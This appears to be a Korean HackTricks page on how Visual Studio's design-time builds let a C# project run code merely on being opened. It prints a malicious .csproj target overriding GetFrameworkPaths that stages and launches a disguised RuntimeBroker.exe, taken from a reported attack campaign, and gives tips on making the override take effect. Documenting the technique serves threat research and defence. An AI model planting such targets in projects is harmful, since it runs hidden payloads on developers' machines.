# Visual Studio 프로젝트의 디자인 타임 MSBuild 실행

{{#include ../banners/hacktricks-training.md}}

Visual Studio에서 C# 프로젝트를 여는 것은 단순히 파일을 읽는 작업이 아닙니다. 개발자가 Build 또는 Run을 선택하기 전에 디자인 타임 빌드가 이름이 지정된 MSBuild 타깃을 호출해 IntelliSense, 참조 및 디버깅을 초기화합니다. `GetFrameworkPaths`는 이러한 타깃 중 하나입니다. 이 타깃을 재정의하는 프로젝트는 별도의 페이로드 클릭 없이 프로젝트를 로드하는 것만으로 사용자 컨텍스트에서 코드를 실행할 수 있습니다.<sup>[[1]](#references)[[2]](#references)</sup>

보고된 프로젝트는 리소스 파일을 선언한 다음, 대체 타깃 안에서 `MakeDir`, `Copy` 및 `Exec`를 사용해 같은 디렉터리에 있는 페이로드를 준비하고 실행했습니다. 이 축약된 예제는 원본의 Figure 6에 나온 실행 경로를 그대로 보존합니다. 이 코드는 독립형 XML 파일이 아니라 `.csproj` 안에 있어야 합니다.<sup>[[1]](#references)</sup>

```xml
<ItemGroup>
  <ResourceFiles Include="Resources\**\*.*" />
</ItemGroup>
<Target Name="GetFrameworkPaths">
  <MakeDir Directories="$(LocalAppData)\Microsoft\RuntimeBrokers" />
  <Copy SourceFiles="@(ResourceFiles)"
        DestinationFolder="$(LocalAppData)\Microsoft\RuntimeBrokers\%(RecursiveDir)"
        SkipUnchangedFiles="true" />
  <Exec Command='start "" "$(LocalAppData)\Microsoft\RuntimeBrokers\RuntimeBroker.exe"' />
</Target>
```

**Import 순서가 중요합니다:** MSBuild는 *마지막* target 정의를 사용합니다. 프로젝트 파일에 작성한 target이 나중에 가져온 파일에서 다시 정의되면 Microsoft target을 대체한다고 보장할 수 없습니다. `<Project Sdk="...">`를 사용하는 SDK 스타일 프로젝트는 프로젝트 본문 뒤에 SDK target을 암시적으로 가져오므로, 모든 프로젝트에서 이 정확한 재정의가 작동한다고 가정하지 말고 평가된 import 순서를 확인하세요. `MSBuild.exe -preprocess:expanded.xml project.csproj` 명령은 프로젝트를 빌드하지 않고 import를 확장하므로 유효한 target 정의를 찾는 데 도움이 됩니다.<sup>[[3]](#references)[[4]](#references)</sup>

이는 개발자 프로젝트의 실행 표면이지, VSIX 확장 설치나 그 자체로 privilege escalation이 아닙니다. 스테이징된 실행 파일이 악성 인접 `.exe.config` 또는 DLL을 사용한다면 [AppDomainManager hijacking and DLL sideloading](windows-local-privilege-escalation/dll-hijacking/)을 계속 살펴보세요.

## References

- [1] [Unit 42 - Blinder Tunnel 캠페인, 이라크 인프라를 표적으로 삼다](https://unit42.paloaltonetworks.com/blinder-tunnel-targets-critical-infrastructure/)
- [2] [Microsoft Learn - Visual Studio 통합(MSBuild)](https://learn.microsoft.com/en-us/visualstudio/msbuild/visual-studio-integration-msbuild?view=visualstudio)
- [3] [Microsoft Learn - MSBuild Targets](https://learn.microsoft.com/en-us/visualstudio/msbuild/msbuild-targets)
- [4] [Microsoft Learn - MSBuild 명령줄 참조](https://learn.microsoft.com/en-us/visualstudio/msbuild/msbuild-command-line-reference?view=visualstudio)
{{#include ../banners/hacktricks-training.md}}
